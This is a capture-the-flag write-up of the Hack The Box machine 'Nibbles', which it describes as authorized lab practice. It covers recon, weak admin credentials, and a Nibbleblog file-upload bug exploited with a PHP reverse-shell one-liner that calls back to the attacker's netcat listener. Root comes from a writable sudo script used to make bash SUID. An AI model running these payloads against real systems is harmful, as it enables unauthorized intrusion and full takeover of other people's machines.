# Nibbles - Hack The Box

Easy Linux box. The way in is an outdated blog CMS with a file upload bug, and
root is a sudo misconfig that lets a normal user run a script they can edit as
root. Textbook stuff, but a few things tripped me up along the way, so I'm
writing down what actually happened, mistakes included.

**Box:** Nibbles | **OS:** Linux | **Difficulty:** Easy | **Status:** Retired

> Authorized lab practice only.

## Recon

Started with nmap, like always:

```bash
nmap -sCV -oN nmap_nibbles.txt 10.10.10.75
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Just SSH and an Apache server. The web page itself is nothing, literally a
"Hello world!" and that's it. But I checked the page source out of habit, and
there was a comment leaving a hidden directory wide open:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Lesson one for the night: always read the source.

Went to `/nibbleblog/` and it's a Nibbleblog CMS. The README gave me the version,
4.0.3. A quick search shows that version has a known authenticated file upload
bug, CVE-2015-6967. So the plan was clear, I just needed admin creds first.

## Getting a shell

The login is at `/nibbleblog/admin.php`, and the creds were weak. `admin` /
`nibbles`, basically the box name.


Once in, the upload bug lives in the "My image" plugin. Instead of a picture I
uploaded a PHP reverse shell:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.x 8083 >/tmp/f"); ?>
```

When you upload it, the plugin tries to resize it like a real image and throws a
wall of errors. That actually threw me off at first, I thought the upload had
failed. It hadn't. The errors just mean it couldn't process my PHP as an image,
but the file still got written to disk, which is the whole point.

Started a listener:

```bash
nc -lvnp 8083
```

and triggered the shell by visiting the uploaded file, which the plugin always
renames to `image.php`:

```
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
```

This is where I burned a chunk of time. Nothing came back, dead silence. Turned
out I had two VPN connections running at the same time, so my shell was calling
back to the wrong tunnel's IP. Killed one VPN, set the callback to my actual
`tun` IP (check it with `ip a`), and the shell landed instantly. If your listener
is silent, check that before you blame the exploit.

Got a shell as `nibbler`, upgraded it to a proper terminal, and grabbed the user
flag:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat /home/nibbler/user.txt
```

## Getting root

First thing after landing any shell, `sudo -l`:

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

So nibbler can run `monitor.sh` as root with no password, and the script sits in
nibbler's own home where I can edit it. A script you control that runs as root
is game over, whatever you put in it runs as root too.

The folder wasn't there yet, it was still inside `personal.zip`, so I unzipped it
first, then added my own line to the script. I went with making bash SUID
because it doesn't rely on a callback coming back to me:

```bash
cd /home/nibbler
unzip personal.zip
echo 'chmod +s /bin/bash' >> personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
/bin/bash -p
id
```

`id` showed euid=0, and root.txt was mine:

```bash
cat /root/root.txt
```

One last snag: running `sudo monitor.sh` with just the filename failed with a
"no tty" error. The sudo rule only allows the exact full path, so you have to
call it as `/home/nibbler/personal/stuff/monitor.sh`. Small thing, but it stops
you cold if you don't catch it.

## Takeaways

- Read the page source. The whole box started with one throwaway comment.
- `sudo -l` is free, and it basically handed me root.
- Most of my time went to the VPN mess, not the actual hacking. Fix your
  environment first before you assume the exploit is broken.
